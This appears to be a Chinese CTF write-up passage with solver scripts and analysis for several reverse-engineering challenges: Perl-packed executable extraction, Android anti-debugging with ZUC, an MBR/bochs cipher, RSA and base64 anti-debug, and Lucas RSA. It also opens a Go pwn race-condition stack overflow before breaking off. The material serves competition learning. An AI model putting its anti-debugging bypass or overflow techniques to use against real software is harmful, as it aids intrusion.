    return decypt_xor_data 

def extract_files_list(files_tables, files_tables_len): 
    print hex(files_tables_len) 
    i = 0 
    files_list = [] 
    while(i < files_tables_len): 
        filename_len = struct.unpack('<H', files_tables[i:i+2])[0] 
        # print hex(filename_len) 
        j = 0 
        filename = '' 
        while(j != filename_len): 
            filename += struct.pack('B', (ord(files_tables[i+2+j:i+2+j+1]) ^ 0xEA)) 
            j = j + 1 
        k = 0 
        # print filename 
        if (filename_len+2) % 4 != 0: 
            k = 4 - ((filename_len+2) % 4) 
        # while(files_tables[i+2+filename_len+k] == '#'): 
        #   k = k + 1 
        filedata_offset = struct.unpack('<I', files_tables[i+2+filename_len+k:i+2+filename_len+k+4])[0] 
        # print filename_len 
        # print filename 
        print filename_len, filename, hex(filedata_offset) 
        files_list.append([filename_len,filename,filedata_offset]) 
        i = i + 2 + filename_len + k + 4 
    return files_list 

def extract_files(input_file,files_list, perl_code_bin): 
    i = 0 
    while(i < len(files_list)): 
        filename = files_list[i][1] 
        filedata_offset = files_list[i][2] 
        filedata_dec_len = struct.unpack('<I', perl_code_bin[filedata_offset:filedata_offset+4])[0] 
        filedata_enc_len = struct.unpack('<I', perl_code_bin[filedata_offset+4:filedata_offset+8])[0] 
        filedata_dec_method = struct.unpack('<I', perl_code_bin[filedata_offset+8:filedata_offset+12])[0] 
        if (filedata_dec_len == filedata_enc_len) and (filedata_dec_method == 0x02): 
            print '[+] XOR  -->  {}'.format(filename) 
            j = 0 
            filedata = '' 
            while (j != filedata_dec_len): 
                filedata += struct.pack('B', (ord(perl_code_bin[filedata_offset+12+j:filedata_offset+12+j+1]) ^ 0xEA)) 
                j = j + 1 
            filename = filename.replace('*','_').replace('<','-') 
            if not os.path.exists('.\\{}'.format(os.path.splitext(os.path.basename(input_file))[0] + "_exe")): 
                os.makedirs('.\\{}'.format(os.path.splitext(os.path.basename(input_file))[0] + "_exe")) 
            if '/' in filename and not os.path.exists('.\\{}\\{}'.format(os.path.splitext(os.path.basename(input_file))[0] + "_exe", filename.replace('/','\\').rsplit('\\',1)[0])): 
                os.makedirs('.\\{}\\{}'.format(os.path.splitext(os.path.basename(input_file))[0] + "_exe", filename.replace('/','\\').rsplit('\\',1)[0])) 
            fd = open('.\\{}\\{}'.format(os.path.splitext(os.path.basename(input_file))[0] + "_exe", filename.replace('/','\\')), 'wb+') 
            fd.write(filedata) 
            fd.close() 
            i = i + 1 
        elif (filedata_dec_len != filedata_enc_len) and (filedata_dec_method == 0x03): 
            print '[+] ZLIB  -->  {}'.format(filename) 
            enc_filedata = perl_code_bin[filedata_offset+12:filedata_offset+12+filedata_enc_len] 
            dec_filedata = zlib.decompress(enc_filedata) 
            j = 0 
            filedata = '' 
            while (j != filedata_dec_len): 
                filedata += struct.pack('B', (ord(dec_filedata[j:j+1]) ^ 0xEA)) 
                j = j + 1 
            filename = filename.replace('*','_').replace('<','-') 
            if not os.path.exists('.\\{}'.format(os.path.splitext(os.path.basename(input_file))[0] + "_exe")): 
                os.makedirs('.\\{}'.format(os.path.splitext(os.path.basename(input_file))[0] + "_exe")) 
            if '/' in filename and not os.path.exists('.\\{}\\{}'.format(os.path.splitext(os.path.basename(input_file))[0] + "_exe", filename.replace('/','\\').rsplit('\\',1)[0])): 
                os.makedirs('.\\{}\\{}'.format(os.path.splitext(os.path.basename(input_file))[0] + "_exe", filename.replace('/','\\').rsplit('\\',1)[0])) 
            fd = open('.\\{}\\{}'.format(os.path.splitext(os.path.basename(input_file))[0] + "_exe", filename.replace('/','\\')), 'wb+') 
            fd.write(filedata) 
            fd.close() 
            i = i + 1 
        else: 
            print '[-] Unknow  -->  {}'.format(filename) 
            i = i + 1 

    return True 

def extract_perl_bin(filename): 
    fd = open(filename, 'rb') 
    orig_data = fd.read() 
    fd.close() 
    if orig_data[0x138F50:0x138F54] == '\xBC\x55\x21\xAB': 
        # print struct.unpack('<I', orig_data[0x138F50:0x138F54])[0] 
        print '[+] Found End Magic' 
    else: 
        print '[-] Not Found End Magic' 
        return False 
    perl_code_bin_total_len = struct.unpack('<I', orig_data[0x138F58:0x138F5C])[0] 
    if orig_data[0x138F50-perl_code_bin_total_len:0x138F54-perl_code_bin_total_len] == '\x7F\x3A\x5B\xAA': 
        print '[+] Found Begin Magic' 
    else: 
        print '[-] Not Found Begin Magic' 
        return False 
    xor_perl_code_bin = orig_data[0x138F50-perl_code_bin_total_len:0x138F50] 
    # print "bin len is %s" % hex(perl_code_bin_total_len) 
    if xor_perl_code_bin == "": 
        print "error" 
    print '[+] Decypt 1st for perl_code_bin' 
    # print xor_perl_code_bin 
    perl_code_bin = decypt_perl_code_bin_xor(xor_perl_code_bin) 
    if perl_code_bin == "": 
        print "error" 
        return 0 
    file_offset = struct.unpack('<H', perl_code_bin[20:22])[0] 
    files_tables_end_offset = struct.unpack('<I', perl_code_bin[24:28])[0] 
    files_tables = perl_code_bin[file_offset:files_tables_end_offset] 
    files_list = extract_files_list(files_tables, files_tables_end_offset-32) 
    ret = extract_files(filename, files_list, perl_code_bin) 

    return ret 

if __name__ == '__main__': 
    if len(sys.argv) == 2: 
        print '----------------------------------------------------------------' 
        print extract_perl_bin(sys.argv[1]) 
        print '----------------------------------------------------------------' 
    else: 
    print 'need one argv which is filename' 
```
最后会解出这样的目录： 
 ![图片](https://uploader.shimo.im/f/RHkdK7Sz36YsJShV.png!thumbnail)

而里面的perl.pl就是最后的perl文件 

![图片](https://uploader.shimo.im/f/K8NsbyIve2ixsdEi.png!thumbnail)

flag就隐藏在此处。 

## easy_apk 

这个apk主要考察两点一个是反调试，一个就是zuc的加密算法 

### 反调试 

反调试分为java层的和native层的反调试，为了稍微加强难度，几乎都采用了字符串加密的方法 

#### JAVA层 

![图片](https://uploader.shimo.im/f/QcRIZpngLYau7dPD.png!thumbnail)

主要分别进行了 


1. 对APK属性的检测，是否debuggable 
2. 检测是否有XposedInstaller的存在 
3. 检测是否有Magisk的存在 

这里的2和3的字符串都是使用的StringFog( [https://github.com/MegatronKing/StringFog](https://github.com/MegatronKing/StringFog))的xor加密的，异或的密钥可以跟进 `a.a` 函数进行查看 

![图片](https://uploader.shimo.im/f/MuwmO8I8fJQQJmsx.png!thumbnail)

java层的反调试可以直接通过新建一个同名工程，将lib导入工程之后直接pass掉。 

接下来看看Native层的反调试 

#### Native层 

Native层主要检测了一些常见的root特征、Xposed以及Frida这两种Hook工具、IDA动态调试 

在 `.init_proc` 函数中 

![图片](https://uploader.shimo.im/f/0ES0ajJZHS5gNHaP.png!thumbnail)

函数主要执行了两种操作， 


1. 第一部分主要检测了常见的su文件的存在 
2. 第二部分通过字符串的动态解密，检测 `system/lib` 目录下是否存在 包含`xposed`的文件 

在 `.init_array` 段中，只存在一个函数 `sub_10EFC`  

![图片](https://uploader.shimo.im/f/sGb6WdlUEAEIOhzS.png!thumbnail)

这个函数最终通过 `pthread_create` 函数创建一个线程，用于检测 `frida` 的存在。 

 `JNI_Onload` 函数主要通过调用 `sub_E260` 函数检测 `/proc/self/maps` 检测 `XposedBridge.jar` 的存在，然后调用 `RegisterNatives` 动态注册 `check` 函数 

### 算法 

算法部分主要就涉及动态注册后的 `check` 函数主要调用了zuc加密算法，key是aes加密算法后的值，在调用check函数后，会再次调用 `CheckMaps` 函数，检测Xposed的存在，同时恢复key的初始值，然后调用 `checkIDA` 函数，访问 `/proc/self/status` 检测IDA的存在，并将status的值赋给key[8],然后进行AES的加密，得到最终zuc的key值 

![图片](https://uploader.shimo.im/f/54eDp5boWdq1o976.png!thumbnail)

zuc算法： [https://github.com/EinarGaustad/MasterThesis/blob/27e9285121002e1dcec1ca0d4325a6d144c3ee72/lib/src/common/liblte_security.cc](https://github.com/EinarGaustad/MasterThesis/blob/27e9285121002e1dcec1ca0d4325a6d144c3ee72/lib/src/common/liblte_security.cc)这里有面有详细的介绍以及源码，主要zuc的算法后面运用了流密码，所以说我们的zuc在流密码的地方进行异或因为zuc本身的算法是不可以逆的，所以说我们流密码进行异或回去（也就是加密就是解密）就是答案 

最终拿到flag 

```plain
W3lcomeT0WMCTF!_*Fu2^_AnT1_32E3$ 
```
 

## WMware 

### 题目描述 

bochs是一个x86cpu模拟器，我写了一个mbr引导程序让 “ cpu ” 从磁盘中读取并执行代码 

关键词：MBR，磁盘读取，键盘驱动，CPU从实模式到保护模式，内存分段，古典密码 

拿到压缩包以后，得丢到linux平台下才能解压，否则7z会报错。因为其中有一个隐藏文件夹，在windows会出错。 

(比赛后补充：貌似windows上可以解压这玩意，但是据说放到linux里头以后会报错？奇奇怪怪的情况一大堆，但是无关紧要啦） 

解压完毕后，首先我们打开bochsrc.txt。bochsrc.txt是bochs的默认配置清单。从中可以看到有一个隐藏文件夹./.src，其中有很多配置文件，以及虚拟磁盘文件 

提取出虚拟磁盘文件./.src/disk ，bochs读取并执行的代码都在其中 

![图片](https://uploader.shimo.im/f/XysPfURfqI70dd5f.png!thumbnail)

计算机启动的时候，先通过MBR引导，再启动操作系统。MBR位于磁盘的第0块，可以用ida（16bits模式）直接打开disk，查看MBR的内容 

注意到图片中红框的位置,MBR从磁盘的第2\6\10个块读取了一些数据到内存中， **基址分别是0x00000900,0x00006000,0x00005700** 

![图片](https://uploader.shimo.im/f/PxUPjd7Ue4S1WXs8.png!thumbnail)

接着我们就可以看一看磁盘的第2、6、10块分别是些什么东西了。 


![图片](https://uploader.shimo.im/f/y5X1ZStn1PE1nqeQ.png!thumbnail)

![图片](https://uploader.shimo.im/f/qFmW2lQ4cxnqYm8q.png!thumbnail)

建议使用winhex或者010之类的工具把从0x400,0xc00和0x1400开始的三段内容先完整的copy出来单独为一个文件进行分析。 

MBR运行结束之后，CPU跳转到了内存的0x900处继续执行代码 

### 磁盘偏移0x400处的代码：让CPU从实模式进入保护模式 

从0x400开始的这段代码做了三件事情： 


1. 通过键盘驱动获取用户输入，并且存入7E3:265这个位置。这里有一个技术点要注意一下。CPU读取的键盘输入读取的是通码，不是ASCII码。这里我是用的是第一套通码，并且只识别了部分数据。需要各位细细揣摩这个粗糙的键盘驱动到底向7E3:265这个位置写入了什么，大小写是如何区分的…… ![图片](https://uploader.shimo.im/f/biFrgEogwmXDVkEp.png!thumbnail)
2. 进入保护模式。这一段代码就不多说了，进入保护模式必须做的：打开A20Gate，加载段表数组到gdt寄存器中，设置cr0从右往左第二个bit为1。进入保护模式后，后面的代码（从图中jmp large far ptr处开始）都是32位的汇编代码，这是一个难点。这个时候我们就得用ida使用32位模式对后面的代码进行分析 ![图片](https://uploader.shimo.im/f/VSAMNGuvcbGdfNXZ.png!thumbnail)
3. 后面这些32位的代码的工作就比较简单了， **首先是设置各段寄存器的段选择子** ，然后进行加密， **列换位密码+对读取到的扫描码的每一个字节都加上0x55** ，这里就不细讲了。完成这个工作之后，跳转到了内存中0x6000处 

### 细节：ds，es中储存的到底是啥，保护模式如何寻址? 

https://github.com/Gstalker/Kernel-Learning/tree/master/Cpt4.Rudiment of Protect Mode 

见README：《GDT与段选择子》 

保护模式下，寻址通过段寄存器中的段选择子，GDT段表中的分段信息进行寻址。如果这一块没摸透，最后这个加密和验证机制可能就很难搞懂 

（wp写于比赛前，比赛后补充：hmmmmmm，其实大家都很快搞懂后面这块了） 

### 磁盘偏移0xc00：“简单的异或运算” 

这一段东西用ida32位可以反编译了。不过不建议看伪码 

>不知道有多少人看到这一步之后被劝退了 

看汇编，算法十分简单。做的都是异或运算。 

参考资料 [https://zhidao.baidu.com/question/205778451.htm](https://zhidao.baidu.com/question/205778451.html)l 

这里用python伪码简单描述一下图中6047，60B3，607d这三条代码块的计算方式。 

![图片](https://uploader.shimo.im/f/kUBPU5oRhRGENUx9.png!thumbnail) 

```python
def xor1(a,b): 
    return (a|b)&(~a|~b) 
def xor2(a,b): 
    return ~(~a&~b)&~(a&b) 
def xor3(a,b): 
    return (a&~b)|(~a&b) 
```
```c++
switch(i){ 
  case 0: 
    group[i] = xor2(xor1(group[i],group[(i+1)%9]),0x24114514); 
    break; 
  case 1: 
    group[i] = xor3(xor2(group[i],group[(i+1)%9]),0x1919810); 
    break; 
  case 2: 
    group[i] = xor1(xor3(group[i],group[(i+1)%9]),0x19260817) 
    break; 
} 
```
![图片](https://uploader.shimo.im/f/NCJLYi3YfefXwTCn.png!thumbnail)

计算完之后，就进行了校验。[ecx-0x12354CD]这个位置可以通过之前提到的段选择子计算出来，位于0x00005700。MBR读取了磁盘中0x1400处的数据，即加密后的flag，并将其存放在这里。 

![图片](https://uploader.shimo.im/f/5hcvl27yON7kwJ2t.png!thumbnail)

那么整个程序的加密流程就比较清晰了，我们可以着手搞一搞exp 

```python
enc_flag = [0xec5574d8,0x421a04b5,0x2ba6d11,0x8105055f,0xeda06c28,0x6ae00499,0x18a955e7,0x71d63591,0x4537a864] 
for n in range(128,-1,-1):               #129轮逻辑运算 
    for i in range(8,-1,-1):           #臭死力 
        if (n%3 == 0): 
            enc_flag[i] = enc_flag[i]^enc_flag[(i+1)%9]^0x24114514 
        elif(n%3 == 1): 
            enc_flag[i] = enc_flag[i]^enc_flag[(i+1)%9]^0x1919810 
        elif(n%3 == 2): 
            enc_flag[i] = enc_flag[i]^enc_flag[(i+1)%9]^0x19260817 
group = [None] * (len(enc_flag) * 4) 
for i in range(9): 
    for n in range(4): 
        group[i*4+n] = (enc_flag[i]>>(8*n))&0xff 
for i in range(len(group)):#凯撒解密 
    group[i] = (group[i] - 0x55)%0x100 

flag = [None] * len(group) 
for i in range(6):#行列密码解密 
    for n in range(6): 
        flag[i*6+n] = group[n*6+i] 
key_board_mapping = { 
    0x2:'1', 
    0x3:'2', 
    0x4:'3', 
    0x5:'4', 
    0x6:'5', 
    0x7:'6', 
    0x8:'7', 
    0x9:'8', 
    0xa:'9', 
    0xb:'0', 
    0xc:'_', 
    0xd:'+', 
    0x10:'q', 
    0x11:'w', 
    0x12:'e', 
    0x13:'r', 
    0x14:'t', 
    0x15:'y', 
    0x16:'u', 
    0x17:'i', 
    0x18:'o', 
    0x19:'p', 
    0x1a:'{', 
    0x1b:'}', 
    0x1e:'a', 
    0x1f:'s', 
    0x20:'d', 
    0x21:'f', 
    0x22:'g', 
    0x23:'h', 
    0x24:'j', 
    0x25:'k', 
    0x26:'l', 
    0x2c:'z', 
    0x2d:'x', 
    0x2e:'c', 
    0x2f:'v', 
    0x30:'b', 
    0x31:'n', 
    0x32:'m', 
    0x39:' ', 
    } 
for i in range(len(flag)):#键盘映射回去 
    if flag[i]>0x39: 
        flag[i] -= 0x30 
        flag[i] = key_board_mapping[flag[i]].upper() 
    else: 
        flag[i] = key_board_mapping[flag[i]] 
for i in flag: 
    print(i,end = '') 
```
## Welcome to CTF 

### 主要流程和难点： 

反调试，字符串混淆，部分函数指针混淆，api调用基本改成GetProcAddress(GetModuleHandleW(modulename),apiname)的形式，miracl大数库的逆向。 

首先有四个反调试。 

1.执行main函数之前，程序先注册VEH和UEF，并设置4个硬件断点，用来改变执行流程或者部分参数。也就是硬断占坑。 

2.执行到硬断处后，VEH会设置T 标志位，产生单步异常后转发给UEF，在有调试器的状况下，异常不会转发到UEF（有SharpOD插件的OD可以过）。 

3.设置完第三个硬断后，调用NtSetInformationThread 0x11。设置完所有硬断后，调用NtSetInformationThread 0x11，但是在该次调用，硬断会把第四个参数被设置为sizeof(PVOID)，正常情况该调用会失败，用带有StrongOD驱动或SharpOD插件的OD调试则会返回成功。 

4.main函数会再调用一次NtSetInformationThread 0x11，是正常调用，让调试器接收不到异常。 

第二次和第三次NtSetInformationThread的结果会存放到全局变量里，用于最后的校验。也就是说一开始被检测到调试器的话，后面就算输入正确的flag也是提示错误。 

main函数没什么要点，判断输入是否为WMCTF{xxx}的形式，是则进入假的验证流程。一开始程序就在函数头设置了硬断，UEF会设置EIP到正确流程。 

真实验证流程为：自定义码表base64解码->判断解码结果长度是否为96位->RSA解密->判断hex大数长度是否为29位->方程校验大数。 

### 分析： 

根据上面的主要流程，可以在SetUnhandledExceptionFilter函数下断，获取UEF的地址，或者直接在IDA里面找到调用SetUnhandledExceptionFilter的地方，推算出函数地址 

```plain
  v9 = GetModuleHandleW(&v22); 
  v10 = GetProcAddress(v9, &v16[1]); 
  *v12 = v13(1, (char *)off_432F80 + 162259905); 
  ((void (__stdcall *)(char *))v10)((char *)off_432F84 + 1987071348); 
```
v10为SetUnhandledExceptionFilter函数地址， off_432F84处的值为89CFC4A8，加上key就是0x40121C。 
UEF只调用了sub_402980，之后就返回了，sub_402980是根据异常触发的地址分别对异常进行处理。 

```plain
int __thiscall sub_402980(_EXCEPTION_POINTERS *this) 
{ 
  PCONTEXT v1; // edx 
  char *v2; // esi 
  _BYTE *v3; // edx 
  signed int v4; // esi 
  char v5; // cl 
  DWORD v6; // eax 
  v1 = this->ContextRecord; 
  v2 = (char *)v1->Eip; 
  if ( v2 == (char *)off_432F90 + 1505898260 ) 
  { 
    v1->Eip = (DWORD)off_432F88 + 1505898259; 
    this->ContextRecord->Esp += 4; 
  } 
  else if ( v2 == (char *)off_432F98 + 1923438580 ) 
  { 
    sub_403F80(*(_DWORD *)((char *)off_432F8C + 1923438579), v1->Eax); 
  } 
  else if ( v2 == (char *)off_432F9C + 1654112553 ) 
  { 
    v3 = (_BYTE *)(v1->Eax + 48); 
    v4 = 5; 
    do 
    { 
      v5 = *(v3 - 1); 
      *(v3 - 1) = *v3; 
      *v3 = v5; 
      v3 += 2; 
      --v4; 
    } 
    while ( v4 ); 
  } 
  else if ( v2 == (char *)off_432F94 + 1918029978 && !byte_438C91 ) 
  { 
    v6 = v1->Esp; 
    byte_438C91 = 1; 
    *(_DWORD *)(v6 + 20) = 4; 
  } 
  return 0; 
} 
```
第一个硬件断点下在了sub_4027C7，也就是假验证流程。对应的处理是修改eip为0x402885，伪代码如下。 
```plain
char __cdecl sub_402885(int *a1) 
{ 
  char v1; // bl 
  _BYTE *v2; // eax 
  _BYTE *v3; // esi 
  int v4; // edx 
  int v5; // ecx 
  unsigned __int16 *v6; // edi 
  _BYTE *v7; // edi 
  unsigned __int16 *v9; // [esp+14h] [ebp-14h] 
  unsigned __int16 *v10; // [esp+18h] [ebp-10h] 
  int v11; // [esp+30h] [ebp+8h] 
  v1 = 0; 
  v2 = operator new[](0x100u); 
  v3 = v2; 
  v4 = a1[4]; 
  if ( (unsigned int)a1[5] >= 0x10 ) 
    v5 = *a1; 
  if ( b64_decode(v2) == 96 ) 
  { 
    v6 = (unsigned __int16 *)mirvar(0); 
    v11 = (int)v6; 
    v9 = (unsigned __int16 *)mirvar(0); 
    v10 = (unsigned __int16 *)mirvar(0); 
    bytestobig(v3, 96, v6); 
    RSA(v6); 
    if ( numdig(v6) == 29 ) 
    { 
      v7 = operator new[](0x100u); 
      bigtobytes(v11, v7); 
      bytestobig(v7, 8, v9); 
      bytestobig(v7 + 8, 7, v10); 
      v1 = check(v9, v10); 
      if ( v7 ) 
        j_j__free(v7); 
      v6 = (unsigned __int16 *)v11; 
    } 
    mirkill(v6); 
    mirkill(v9); 
    mirkill(v10); 
  } 
  if ( v3 ) 
    j_j__free(v3); 
  return v1; 
} 
```
base64部分魔改了码表和码表的形式，UEF还会调换部分码表的顺序，真实码表为 
 `{255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,             255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,             255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 9, 255,             255, 255, 54, 63, 8, 46, 12, 4, 27, 10, 0, 39, 47, 255, 255,             255, 255, 255, 255, 255, 29, 53, 41, 11, 17, 59, 5, 49, 21, 7,             16, 35, 40, 2, 38, 24, 55, 30, 60, 26, 50, 34, 6, 31, 45,             52, 255, 255, 255, 255, 255, 255, 25, 23, 48, 58, 19, 44, 15, 62,             51, 56, 13, 28, 1, 18, 20, 22, 61, 14, 32, 43, 57, 37, 3,             42, 33, 36, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,             255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,             255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,             255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,             255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,             255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,             255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,             255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,             255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255}` 

可以写代码还原成可见字符串。码表为 7mNw4GWJ1+6D3krgKEneoIpbPaT5lARXsyVLzvO8MCxtfY29cHUiZB/QjudFSqh0 ，直接用上面那个表也没问题。base64解码结果转成大数，进入RSA部分。 

RSA部分没有硬断，可以提取出d和n,n是已经被分解出来的RSA-768,直接在网上搜索得到p q 

，进而求出e。解密出来的结果会转成bytes，前8个字节和后7个字节分别转成大数。进入校验部分。 

```plain
char __thiscall RSA(void *this) 
{ 
  void *v1; // ebx 
  _BYTE *v2; // eax 
  signed int v3; // edi 
  _BYTE *v4; // esi 
  unsigned __int16 *v6; // [esp+Ch] [ebp-74h] 
  unsigned __int16 *v7; // [esp+10h] [ebp-70h] 
  void *v8; // [esp+14h] [ebp-6Ch] 
  char v9; // [esp+18h] [ebp-68h] 
  v8 = this; 
  v1 = (void *)mirvar(0x10000); 
  v7 = (unsigned __int16 *)mirvar(0); 
  v6 = (unsigned __int16 *)mirvar(0); 
  v2 = (_BYTE *)getN((int)&v9); 
  v3 = 96; 
  v4 = v2 + 1; 
  do 
  { 
    *v4++ ^= *v2; 
    --v3; 
  } 
  while ( v3 ); 
  v2[97] = 0; 
  bytestobig(v2 + 1, 96, v7); 
  incr(1, (int)v1); 
  powmod((int)v1, (int)v8, (int)v7, v6); 
  copy(v6, v8); 
  mirkill(v1); 
  mirkill(v7); 
  mirkill(v6); 
  return 1; 
} 
```
大数校验部分，是一道丢番图方程，也是可以在网上找到答案，为了提示，方程已经内置了一个大数，比较结果时，会减去反调试结果(反调试结果记为anti)。大致为 
(-x)^3+(80435758145817515)^3+ (z)^3 = 43-anti 

正常运行时anti为1，方程右边为42，用 80435758145817515 42等字样搜索，就能得到答案，x=80538738812075974，z=12602123297335631。 

按照上面的流程，将x和z转成16进制，拼接到一起后，RSA加密后base64，补上WMCTF{}就是flag了。 

附上py脚本 

```python
from string import maketrans 
import gmpy2 

def getb64strtable(): 
    b64table = [ 
        255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 
        255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 
        255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 9, 255, 
        255, 255, 54, 63, 8, 46, 12, 4, 27, 10, 0, 39, 47, 255, 255, 
        255, 255, 255, 255, 255, 29, 53, 41, 11, 17, 59, 5, 49, 21, 7, 
        16, 35, 40, 2, 38, 24, 55, 30, 60, 26, 50, 34, 6, 31, 45, 
        52, 255, 255, 255, 255, 255, 255, 25, 23, 48, 58, 19, 44, 15, 62, 
        51, 56, 13, 28, 1, 18, 20, 22, 61, 14, 32, 43, 57, 37, 3, 
        42, 33, 36, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 
        255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 
        255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 
        255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 
        255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 
        255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 
        255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 
        255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 
        255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255 
    ] 
    strt = [''] * 64 
    for i in range(len(b64table)): 
        if b64table[i] != 255: 
            strt[b64table[i]] = chr(i) 
    return ''.join(strt) 

if __name__ == '__main__': 
    tmp_m = '011E218E658D3FC62CC5907A8DA94F'  # 11E218E658D3FC6+2CC5907A8DA94F 
    # tmp_e = '740DE48760442835BAAD5E1990453A9D16DB7976D3F8BB98BF99C0C01CBE9B9C12B808C80683D1E346C16C79AC162874F28CA610C1B97E5E1FFAE95725CE0C6B031C3E188B17187A793B322CC4004C568E76C9B258542EA2A2D6ECD462FFF401' 
    tmp_n = 'CAD984557C97E039431A226AD727F0C6D43EF3D418469F1B375049B229843EE9F83B1F97738AC274F5F61F401F21F1913E4B64BB31B55A38D398C0DFED00B1392F0889711C44B359E7976C617FCC734F06E3E95C26476091B52F462E79413DB5' 
    b64_s = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' 
    b64_t = getb64strtable() 
    # b64_t = '7mNw4GWJ1+6D3krgKEneoIpbPaT5lARXsyVLzvO8MCxtfY29cHUiZB/QjudFSqh0' 
    tran = maketrans(b64_s, b64_t) 
    p = 33478071698956898786044169848212690817704794983713768568912431388982883793878002287614711652531743087737814467999489 
    q = 36746043666799590428244633799627952632279158164343087642676032283815739666511279233373417143396810270092798736308917 
    d = 0x10001 
    m = int(tmp_m, 16) 
    # e = int(tmp_e, 16) 
    phiN = (p - 1) * (q - 1) 
    e = gmpy2.invert(d, phiN) 
    print 'e =', hex(e) 
    n = int(tmp_n, 16) 
    enc = pow(m, e, n) 
    dec = pow(enc, d, n) 
    print 'test:', hex(dec)  # test RSA 
    b64 = hex(enc)[2:] 
    b64 = b64.decode('hex') 
    flag = 'WMCTF{' + b64.encode('base64').translate(tran).replace('\n', '') + '}' 
    print len(b64), flag 
```
 
## Meet in July 

1. 用msieve分解得到N的素因子， N是257bits的Modulus可以几分钟内分解。 

N= 1000000000000000000000000000000E98C3C3C3C3C3C3C3C3C3C3C3C3C3C6B15 

分解得到两个素因子： 

P = F0F0F0F0F0F0F0F0F0F0F0F0F0F0F185 

Q = 110000000000000000000000000000051 

2. 从程序取出参数： 

string msg="rdyu@20200701"; 

char *keytail = "E98C3C3C3C3C3C3C3C3C3C3C3C3C3C6B15"; 

并计算： 

Hash = sha2_hmac(keytail, msg) 

得到hash= 

234704797D8535D5BDEFCFC753B935B1676A8DC2D7D63759DE1A6144862F8445 

 

Hash转为256 bits的big number 

 

3. 根据程序验证： 

取 flag{s} ， 验证  lucas(s, e, N) == hash， 验证通过则flag正确。 

实际是已知明文hash，公钥e,n, 求对应的lucas-RSA密文s。 

程序取e=0x7,采用迭代方式计算lucas序列： 

如下： Lucas e(s,1) mod N 

Lucas sequence 采用如下迭代： 

Vi+j = Vi * Vj - Vi-j 

 

根据代码的计算流程，看出来是计算了 lucas V7, 所以得到e=7 

Lucas e(S, 1) mod N， 如下计算： 

V0 = 2 

V1 = S 

V2 = S^2 - 2 

V3 = V2 * V1 - V1 

V4 = V3 * V1 - V2 

V7 = V4 * V3 - V1 

 

从而取phi= lcm(p-1, q-1, p+1,q+1) , lcm为最小公倍数。 

d = inverse(e, phi) = inverse(7, phi) ,得到d 

 

然后解出s： 

s = lucas( hash, d, N ) 

得到： 26EDE3FE048B6BFA04F647259A3F00505FD9C9CCB87298CD631FD91F17CCB620 

 



 


# **Pwn：** 

## cfgo-LuckyMaze 

这次一共出了三道go pwn题，还有一个在web分类下的base64，golang本身内存安全没啥漏洞，三题最终都是用unsafe包来故意制造的栈溢出，做法也都差不多。不过我在编译文件上做了些手脚来让 [IDAGolangHelper](https://github.com/sibears/IDAGolangHelper)的重命名失效， 如果你尝试过重命名会发现函数名全是杂乱的字符，这样做的 目的是使得Golang的strip更加彻底，达到真正意义上的strip。不过这并不代表没法继续逆向（因为Golang编译后函数特别多），如果多用ida看看编译后的golang是可以发现用户编写的代码总是在最后面，x_cgo*****之前，所以我们只需要关心最后位置的几个函数，再往上都是import进来的内容 ![图片](https://uploader.shimo.im/f/x51OYiDZWAm5uYVy.png!thumbnail)

对于本题而言是cfgo-CheckIn这题的一个升级版本，根据用户的输入计算sha512再生成aztec码，如果你能从右下角走到正中间的🚩就能到达win函数触发栈溢出，使用 aztec码的原因是它中间必定有两圈墙，所以正常方法肯定走不过去。这里存在一个条件竞争，也是与cfgo-CheckIn一题的区别之处：单独启动了一个goroutine来进行当前上下左右四个方向墙的检测并不断更新墙状态来表示当前什么方向能移动（cfgo-CheckIn中是每走一步检测一下所以不存在条件竞争），而主goroutine中又在循环处理用户的输入并根据墙状态来判断是否能移动，所以如果我们快速的w几下就有小概率能够“穿墙”，为了保证能重复的穿墙我们w后需要s一下。通过不断的wws我们就能一路穿墙到右上角。最后，如果想要稳定到达中间的🚩，需要类似下图这样的路线，同时保证初始状态是能够w走至少一步的，这样wws才能成功穿墙。另外payload和生成的图形具有反馈关系，所以需要不停的调整payload里面那些无用的pad字符，生成能够往上走至少一步的aztec。 ![图片](https://uploader.shimo.im/f/dry8QwhrT6DiRIrL.png!thumbnail)

到达🚩后实际上就是和 cfgo-CheckIn差不多的栈溢出了， 后面也给出了关键操作的hint：wws、aad，不过没人做出来了，可能是没 [IDAGolangHelper](https://github.com/sibears/IDAGolangHelper)看着头疼吧2333。 

exp中的几个点： 


1. win函数中把slice溢出后又printf了一下，是给大家任意地址读用的，按slice的结构体覆盖了就行 
```go
struct slice{ 
  byte* array; 
  uintgo len; 
  uintgo cap; 
} 
```
